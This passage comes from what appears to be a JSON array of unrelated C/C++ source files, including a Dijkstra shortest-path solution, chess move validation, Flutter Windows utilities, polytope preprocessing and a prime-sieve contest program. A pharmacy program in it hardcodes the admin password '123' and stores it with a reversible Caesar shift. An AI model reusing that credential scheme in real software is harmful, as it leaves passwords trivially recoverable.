IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowInputs()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] User Guide / ShowUserGuide()\n//",
    "/*\n    \u7531\u4e8en\u8fc7\u5927\uff0c\u6240\u4ee5\u6211\u4eec\u7528\u90bb\u63a5\u8868\u53bb\u5b58\u50a8\u8282\u70b9\n    \u5728\u539f\u6765\u7684dijkstra\u7b97\u6cd5\u91cc\uff0c\u5c06\u4e2d\u95f4\u7684n^2\u5faa\u73af\u7528\u5806\u4f18\u5316\uff0c\u53d8\u6210\u4ecen^2\u4e2a\u70b9\u627e\u5230\u4e00\u4e2a\u6700\u5c0f\u503c\uff0c\u590d\u6742\u5ea6\u964d\u4e3amlogm\n\n\u6b65\u9aa4:\n    \u521b\u5efa\u4e00\u4e2a\u4f18\u5148\u961f\u5217\uff0c\u7528\u4e8e\u7ef4\u62a41-n\u7684\u6700\u77ed\u8def\u5f84\u4e0e\u8282\u70b9\n    \u4ece1\u5f00\u59cb\u904d\u5386\uff0c\u6bcf\u6b21\u53d6\u51fa\u6700\u5c0f\u8def\u5f84\uff0c\u518d\u5229\u7528\u8fd9\u4e2a\u8282\u70b9\u53bb\u66f4\u65b0dist\n\n\n\u6ce8\u610f\uff1am\u5728\u5b8c\u5168\u56fe\u4e2d\u4f1a\u9000\u5316\u6210n^2logn^2\uff0c\u4e0d\u5982\u66b4\u529b\n*/\n\n#include<iostream>\n#include<cmath>\n#include<cstring>\n#include<algorithm>\n#include<queue>\n#include<vector>\nusing namespace std;\ntypedef pair<int,int>PII;\nconst int N = 200010;\n\nint dist[N];\nvector<vector<pair<int,int> > >h(N);\nbool st[N];\nint n,m;\nint dijkstra(){\n    memset(dist,0x3f,sizeof dist);\n    priority_queue<pair<int,int>,vector<pair<int,int>>,greater<pair<int,int>>>heap;//\u5c0f\u6839\u5806\n    dist[1]= 0;\n    heap.push({0,1});//xdist\u6743\uff0cy\u8282\u70b9\n\n    while(heap.size()){\n        auto t = heap.top();\n        heap.pop();\n        int distance = t.first,val = t.second;\n        if(st[val])continue;//\u5982\u679c\u8fd9\u4e2a\u8282\u70b9\u88ab\u7528\u8fc7\u4e86\uff0c\u5c31\u9000\u51fa\n        for(int i = 0;i<h[val].size();i++){\n            int j = h[val][i].first,wj = h[val][i].second;\n            if(dist[j]>distance+wj){\n                dist[j] = distance+wj;\n                heap.push({dist[j],j});\n            }\n        }\n        st[val] = true;//\u66f4\u65b0\n    }\n    if(dist[n] == 0x3f3f3f3f)return -1;\n    else return dist[n];\n\n\n}\n\n\nint main(){\n    cin>>n>>m;\n    int x,y,c;\n    for(int i = 0;i<m;i++){\n        cin>>x>>y>>c;\n        h[x].push_back({y,c});\n\n    }\n    int t = dijkstra();\n    printf(\"%d\\n\",t);\n}\n\n\n",
    "#include \"Logica_joc.h\"\r\n#include <iostream>\r\n#include <cmath>\r\n#include <string>\r\n#include \"Tabla_de_sah.h\"\r\n\r\nusing namespace std;\r\nbool Logica_joc::verificaMiscare( Piese& p, int xInitial, int yInitial, int xFinal, int yFinal,string culoare,Tabla_de_sah tabla)\r\n{\r\n\r\n    char x=tabla.getvaloareCelula(xInitial,yInitial);\r\n    char tipPiesa = p.getTip();\r\n    string culoarePiesa = p.getCuloare();\r\n    if(tipPiesa=='*')\r\n        return false;\r\n    if(culoare==culoarePiesa)\r\n    {\r\n        switch(tipPiesa)\r\n        {\r\n        case 'P':\r\n\r\n            return verificaMiscarePion(xInitial,yInitial,xFinal,yFinal,culoarePiesa,tabla);\r\n            break;\r\n        case 'K':\r\n            return verificaMiscareRege( xInitial, yInitial, xFinal, yFinal, culoarePiesa,tabla);\r\n            break;\r\n        case 'Q':\r\n            return verificaMiscareRegina(xInitial,yInitial,xFinal,yFinal,culoarePiesa,tabla);\r\n\r\n            break;\r\n        case 'R':\r\n            return verificaMiscareTurn(xInitial,yInitial,xFinal,yFinal,tabla);\r\n            break;\r\n        case 'N':\r\n            return verificaMiscareCal(xInitial,yInitial,xFinal,yFinal,culoarePiesa,tabla);\r\n            break;\r\n        case 'B':\r\n            return verificaMiscareNebun(xInitial,yInitial,xFinal,yFinal,culoarePiesa,tabla);\r\n            break;\r\n\r\n        }\r\n\r\n    }\r\n    if(culoare==p.getCuloare())\r\n    {\r\n        switch(tipPiesa)\r\n        {\r\n        case 'p':\r\n            return verificaMiscarePion(xInitial,yInitial,xFinal,yFinal,culoarePiesa,tabla);\r\n            break;\r\n        case 'k':\r\n            return verificaMiscareRege( xInitial, yInitial, xFinal, yFinal, culoarePiesa, tabla);\r\n            break;\r\n        case 'q':\r\n            return verificaMiscareRegina(xInitial,yInitial,xFinal,yFinal,culoarePiesa,tabla);\r\n            break;\r\n        case 'r':\r\n            return verificaMiscareTurn(xInitial,yInitial,xFinal,yFinal,tabla);\r\n            break;\r\n        case 'n':\r\n            return verificaMiscareCal(xInitial,yInitial,xFinal,yFinal,culoarePiesa,tabla);\r\n            break;\r\n        case 'b':\r\n            return verificaMiscareNebun(xInitial,yInitial,xFinal,yFinal,culoarePiesa,tabla);\r\n            break;\r\n\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\nbool Logica_joc::verificaMiscareRege(int xInitial, int yInitial, int xFinal, int yFinal, string culoarePiesa, Tabla_de_sah tabla)\r\n{\r\n    // Calcul\u0103m distan\u021bele \u00een x \u0219i y\r\n    int deltaX = abs(xFinal - xInitial);\r\n    int deltaY = abs(yFinal - yInitial);\r\n\r\n    // Verific\u0103m dac\u0103 mi\u0219carea este \u00een raza unui p\u0103trat\r\n    if (deltaX <= 1 && deltaY <= 1)\r\n    {\r\n        // Verific\u0103m dac\u0103 destina\u021bia este liber\u0103 sau ocupat\u0103 de o pies\u0103 advers\u0103\r\n        char celulaFinala = tabla.getvaloareCelula(xFinal, yFinal);\r\n        char celulaInitiala = tabla.getvaloareCelula(xInitial, yInitial);\r\n\r\n        // Regele poate muta doar pe o pozi\u021bie liber\u0103 sau pe o pozi\u021bie ocupat\u0103 de o pies\u0103 advers\u0103\r\n        if (celulaFinala == '*' ||\r\n                (isupper(celulaInitiala) && islower(celulaFinala)) ||\r\n                (islower(celulaInitiala) && isupper(celulaFinala)))\r\n        {\r\n            // Simul\u0103m mutarea regelui\r\n            tabla.setValoareCelula(xFinal, yFinal, celulaInitiala);\r\n            tabla.setValoareCelula(xInitial, yInitial, '*');\r\n\r\n            // Verific\u0103m dac\u0103 regele este \u00een \u0219ah \u00een noua pozi\u021bie\r\n            bool inSah = esteSah(culoarePiesa, tabla);\r\n\r\n            // Restaur\u0103m tabla\r\n            tabla.setValoareCelula(xInitial, yInitial, celulaInitiala);\r\n            tabla.setValoareCelula(xFinal, yFinal, celulaFinala);\r\n\r\n            // Dac\u0103 regele nu este \u00een \u0219ah, mutarea este valid\u0103\r\n            if (!inSah)\r\n            {\r\n                return true;\r\n            }\r\n        }\r\n    }\r\n\r\n    // Mi\u0219carea nu este valid\u0103\r\n    return false;\r\n}\r\n\r\nbool Logica_joc::verificaMiscareRegina(int xInitial, int yInitial, int xFinal, int yFinal, string culoarePiesa, Tabla_de_sah tabla)\r\n{\r\n    bool Traseu_liber = true;\r\n\r\n    if (xInitial == xFinal || yInitial == yFinal)\r\n    {\r\n        // Verific\u0103m dac\u0103 este o mi\u0219care pe aceea\u0219i coloan\u0103\r\n        if (xInitial == xFinal)\r\n        {\r\n            int minCol, maxCol;\r\n            if (yInitial < yFinal)\r\n            {\r\n                minCol = yInitial;\r\n                maxCol = yFinal;\r\n            }\r\n            else\r\n            {\r\n                minCol = yFinal;\r\n                maxCol = yInitial;\r\n            }\r\n            for (int i = minCol + 1; i < maxCol; i++)\r\n            {\r\n                if (tabla.getvaloareCelula(xInitial, i) != '*')\r\n                {\r\n                    Traseu_liber = false;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n        // Verific\u0103m dac\u0103 este o mi\u0219care pe acela\u0219i r\u00e2nd\r\n        else if (yInitial == yFinal)\r\n        {\r\n            int minRow, maxRow;\r\n            if (xInitial < xFinal)\r\n            {\r\n                minRow = xInitial;\r\n                maxRow = xFinal;\r\n            }\r\n            else\r\n            {\r\n       ",
    "#include \"utils.h\"\r\n\r\n#include <flutter_windows.h>\r\n#include <io.h>\r\n#include <stdio.h>\r\n#include <windows.h>\r\n\r\n#include <iostream>\r\n\r\nvoid CreateAndAttachConsole() {\r\n  if (::AllocConsole()) {\r\n    FILE *unused;\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\r\n      _dup2(_fileno(stdout), 1);\r\n    }\r\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\r\n      _dup2(_fileno(stdout), 2);\r\n    }\r\n    std::ios::sync_with_stdio();\r\n    FlutterDesktopResyncOutputStreams();\r\n  }\r\n}\r\n\r\nstd::vector<std::string> GetCommandLineArguments() {\r\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\r\n  int argc;\r\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\r\n  if (argv == nullptr) {\r\n    return std::vector<std::string>();\r\n  }\r\n\r\n  std::vector<std::string> command_line_arguments;\r\n\r\n  // Skip the first argument as it's the binary name.\r\n  for (int i = 1; i < argc; i++) {\r\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\r\n  }\r\n\r\n  ::LocalFree(argv);\r\n\r\n  return command_line_arguments;\r\n}\r\n\r\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\r\n  if (utf16_string == nullptr) {\r\n    return std::string();\r\n  }\r\n  int target_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      -1, nullptr, 0, nullptr, nullptr)\r\n    -1; // remove the trailing null character\r\n  int input_length = (int)wcslen(utf16_string);\r\n  std::string utf8_string;\r\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\r\n    return utf8_string;\r\n  }\r\n  utf8_string.resize(target_length);\r\n  int converted_length = ::WideCharToMultiByte(\r\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\r\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\r\n  if (converted_length == 0) {\r\n    return std::string();\r\n  }\r\n  return utf8_string;\r\n}\r\n",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <sstream>\n#include <vector>\n#include <conio.h> // For _getch()\n\nusing namespace std;\n\n// Function declarations\nstring encryptPassword(const string& password, int shift);\nstring decryptPassword(const string& encryptedPassword, int shift);\nstring encrypt(string text, int shift);\nstring decrypt(string text, int shift);\nstring getHiddenPassword();\n\ntemplate <typename T>\nstring to_string_custom(const T& value) {\n    stringstream ss;\n    ss << value;\n    return ss.str();\n}\n\nclass Pharmacy {\nprivate:\n    double total = 0.0;\n    string productDetails = \"\";\n    vector<int> productQuantities;\n    string adminPassword;\n\npublic:\n    Pharmacy() : productQuantities(8, 10) {\n        // Initialize default password\n        adminPassword = encryptPassword(\"123\", 3); // Encrypt default password \"123\" with shift 3\n    }\n\n    // Function to verify the password\n    bool verifyPassword(const string& password) {\n        // Decrypt the stored password and compare with the entered password\n        return decryptPassword(adminPassword, 3) == password; // Decrypt with shift 3\n    }\n\n    // Function to set a new password\n    void setPassword(const string& newPassword) {\n        // Encrypt the new password and store it\n        adminPassword = encryptPassword(newPassword, 3); // Encrypt with shift 3\n    }\n\n     void processOrder(const string& productName, double productPrice, int quantity) {\n        int productIndex = getProductIndex(productName);\n        if (productIndex >= 0) {\n            if (!productQuantities.empty() && productQuantities[productIndex] >= quantity) {\n                total += productPrice * quantity;\n                productDetails += productName + \"\\t\\t$\" + to_string_custom(productPrice) + \"\\tQuantity: \" + to_string_custom(quantity) + \"\\n\";\n                productQuantities[productIndex] -= quantity;\n                cout << \"\\n\\tAdding \" << quantity << \" packet(s) of \" << productName << \" to the order. Price: $\" << productPrice * quantity << endl<<endl;\n            } else {\n                cout << \"Not enough stock for \" << productName << \". Available quantity: \" << productQuantities[productIndex] << endl;\n            }\n        } else {\n            cout << \"Invalid product name. Please try again.\" << endl;\n        }\n    }\n\n    void addProductQuantity(const string& productName, int quantity, const string& password) {\n        if (verifyPassword(password)) {\n            int productIndex = getProductIndex(productName);\n            if (productIndex >= 0) {\n                productQuantities[productIndex] += quantity;\n                cout << \"\\n\\tAdded \" << quantity << \" packets of \" << productName << \" to the stock.\" << endl;\n                cout << \"\\n\\tNEW QUANTITY OF \" << productName << \": \" << productQuantities[productIndex] << \" packets\" << endl;\n            } else {\n                cout << \"Invalid product name. Please try again.\" << endl;\n            }\n        } else {\n            cout << \"Incorrect password. Only the administrator can add product quantity.\" << endl;\n        }\n    }\n\n    void printReceipt(const string& fname, const string& sname) {\n        ofstream file(\"receipt.txt\");\n        if (file.is_open()) {\n            file << \"\\t------ Receipt ------\" << endl;\n            file << fname << \"\\t\" << sname << endl;\n            file << \"\\Product\\t\\tPrice\\tQuantity\" << endl;\n            file << productDetails;\n            file << \"-----------------------\" << endl;\n            file << \"\\Total:\\t\\t$\" << total << endl;\n            file.close();\n\n            cout << \"\\tReceipt has been stored in receipt.txt\" << endl;\n        } else {\n            cout << \"Unable to create the receipt file.\" << endl;\n        }\n    }\n\n    void printtheReceipt(const string& fname, const string& sname) {\n        cout << \"\\n------------------- RECEIPT ------------------\" << endl;\n        cout << \"Customer Name: \" << fname << \"\\t\" << sname << endl;\n        cout << \"Product\\t\\tPrice\\tQuantity\" << endl;\n        cout << productDetails;\n        cout << \"------------------------------------------------\" << endl;\n        cout << \"\\Total:\\t\\t$\" << total << endl;\n    }\n\n    void addNewProduct(const string& productName, double productPrice, const string& password) {\n        if (verifyPassword(password)) {\n            int productIndex = getProductIndex(productName);\n            if (productIndex == -1) {\n                productDetails += productName + \"\\t\\t$\" + to_string_custom(productPrice) + \"\\n\";\n                productQuantities.push_back(10);\n                cout << \"\\n\\tAdded new product: \" << productName << \" Price: $\" << productPrice << endl;\n            } else {\n                cout << \"Product with the same name already exists. Use 'addProductQuantity' to update quantity.\" << endl;\n            }\n        } else {\n            cout << \"Incorrect password. Only the administrator can add a new product.\" << endl;\n        }\n    }\n\nprivate:\n    int getProductIndex(const string& product",
    "#include \"glpk.h\"\n#include \"polytope.h\"\n\n// Must set ori_0 and return square of r_0\nconst double polytope::initEllipsoid(vec &ori) {\n  double r_0s = 0;\n  ori.zeros(n);\n  // Initialize LP (with glp)\n  glp_prob *lp;\n  lp = glp_create_prob();\n  glp_set_obj_dir(lp, GLP_MAX);\n  glp_add_rows(lp, m);\n  glp_add_cols(lp, n);\n\n  glp_smcp parm;\n  glp_init_smcp(&parm);\n  parm.msg_lev = GLP_MSG_ERR;\n\n  // Constraints\n  // GLP row setting need data from index 1 not 0\n  int ind[n + 1];\n  double val[n + 1];\n  for (size_t i = 1; i < m + 1; i++) {\n    for (size_t j = 1; j < n + 1; j++) {\n      ind[j] = j;\n      val[j] = A(i - 1, j - 1);\n    }\n    glp_set_mat_row(lp, i, n, ind, val);\n    glp_set_row_bnds(lp, i, GLP_UP, 0, b(i - 1));\n  }\n\n  // Freeing the column\n  for (size_t j = 1; j < n + 1; j++) {\n    glp_set_col_bnds(lp, j, GLP_FR, 0, 0);\n  }\n\n  // Getting the bounds\n  for (size_t i = 1; i < n + 1; i++) {\n    double ub, lb;\n\n    // Objective +x_i\n    for (size_t j = 0; j < n + 1; j++) {\n      if (j != i) {\n        glp_set_obj_coef(lp, j, 0);\n      } else {\n        glp_set_obj_coef(lp, j, 1);\n      }\n    }\n\n    glp_simplex(lp, &parm);\n    ub = glp_get_obj_val(lp);\n\n    // Origin Update\n    for (size_t j = 1; j < n + 1; j++) {\n      ori[j - 1] += (glp_get_col_prim(lp, j)) / (2 * n);\n    }\n\n    // Objective -x_i\n    for (size_t j = 0; j < n + 1; j++) {\n      if (j != i) {\n        glp_set_obj_coef(lp, j, 0);\n      } else {\n        glp_set_obj_coef(lp, j, -1);\n      }\n    }\n\n    glp_simplex(lp, &parm);\n    lb = -glp_get_obj_val(lp);\n\n    // Origin Update\n    for (size_t j = 1; j < n + 1; j++) {\n      ori[j - 1] += (glp_get_col_prim(lp, j)) / (2 * n);\n    }\n\n    r_0s += pow(ub - lb, 2);\n  }\n\n  glp_delete_prob(lp);\n  return r_0s;\n}\n\nvoid polytope::preprocess() {\n  // Assuming r = 2n\n  // beta = 1 / 2n\n  double beta = 0.5 / n;\n\n  // Ellipse parameters\n  vec ori;\n  double r_s = initEllipsoid(ori);\n  mat T;\n  T.eye(n, n);\n  T = T * r_s;\n\n  // Some constants required for the upcoming computation\n  double beta_sqr = beta * beta;\n  double cons1 = (1 - n * beta) / (n + 1);\n  double cons2 =\n      (2 * n * n + pow(1 - n * beta, 2)) * (1 - beta_sqr) / (2 * n * n - 2.0);\n  double cons3 = 2 * cons1 / (1 - beta);\n\n  // The main preprocessing algorithm\n  for (size_t k = 0;; ++k) {\n    size_t i;\n    bool found_i = false;\n\n    // The value of T_k and a_i\n    vec ta;\n\n    // Find i such that a_i x <= b_i does not hold\n    vec signed_dis = A * ori - b;\n    uvec indices = find(signed_dis > 0, 1);\n\n    if (!indices.is_empty()) {\n      found_i = true;\n      i = indices(0);\n      ta = T * A.row(i).t();\n    } else {\n      // Does the original code have a bug here?\n      for (size_t j = 0; j < m; ++j) {\n        ta = T * A.row(j).t();\n        if (beta_sqr * as_scalar(A.row(j) * ta) -\n                signed_dis[j] * signed_dis[j] >\n            0) {\n          found_i = true;\n          i = j;\n          break;\n        }\n      }\n    }\n\n    if (!found_i)\n      break;\n\n    // Updating parameters\n    vec c = ta / sqrt(as_scalar(A.row(i) * ta));\n    ori = ori - cons1 * c;\n    T = cons2 * (T - cons3 * c * c.t());\n  }\n\n  mat L = chol(T); // Check for runtime errors\n  b = (b - A * ori) / beta;\n  A = A * L.t();\n  gamma = det(L) * pow(beta, n);\n}\n",
    "#include <fstream>\r\n#include <cmath>\r\n#include <algorithm>\r\nusing namespace std;\r\n\r\nifstream cin(\"ron.in\");\r\nofstream cout(\"ron.out\");\r\n\r\nconst int VMAX = 1e5*2;\r\nconst int N = 5e4;\r\n\r\nint prim[VMAX+1];\r\nint v1[N+1];\r\nint v2[N+1];\r\nint poz[N+1];\r\n\r\nvoid ciur(){\r\n\r\nfor (int i = 2; i*i<=VMAX; i++){\r\n    if(prim[i]==0){\r\n        for (int j = i*i; j<=VMAX;j+=i){\r\n            prim[j]=1;\r\n        }\r\n    }\r\n}\r\n\r\n}\r\n\r\nvoid sumpart(){\r\nint s = 0;\r\nfor (int i = 2; i<=VMAX; i++){\r\n    s+=!(prim[i]);\r\n    prim[i]=s;\r\n}\r\n\r\n}\r\n\r\nbool cmp(int p1, int p2){\r\n    return (v1[p1]<v1[p2]);\r\n}\r\n\r\nint main()\r\n{\r\n\r\n    int c,n;\r\n\r\n    cin>>c>>n;\r\n\r\n    if(c==1){\r\n        int maxx = 0;\r\n        ciur();\r\n        sumpart();\r\n        for (int i = 1; i<=n;i++){\r\n            int poz, l;\r\n            cin>>poz>>l;\r\n            int e = poz+l-1;\r\n            int pr = prim[(int)sqrt(e)]-prim[(int)sqrt(poz-1)];\r\n            maxx = max(maxx, pr);\r\n\r\n        }\r\n        cout<<maxx;\r\n\r\n    }\r\n\r\n    if(c==2){\r\n        for (int i = 1; i<=n;i++){\r\n        int poz1, l;\r\n        cin>>poz1>>l;\r\n        int e = poz1+l-1;\r\n        v1[i]=poz1;\r\n        v2[i]=e;\r\n        poz[i]=i;\r\n        }\r\n        sort(poz,poz+n+1,cmp);\r\n\r\n        int emax = 0;\r\n        int ctr=0;\r\n        for (int i = 1; i<=n;i++){\r\n            int pos = poz[i];\r\n            if(v1[pos]>emax){\r\n                ctr++;\r\n            }\r\n            emax = max(emax, v2[pos]+1);\r\n        }\r\n        cout<<ctr;\r\n    }\r\n\r\n\r\n    return 0;\r\n}\r\n"
]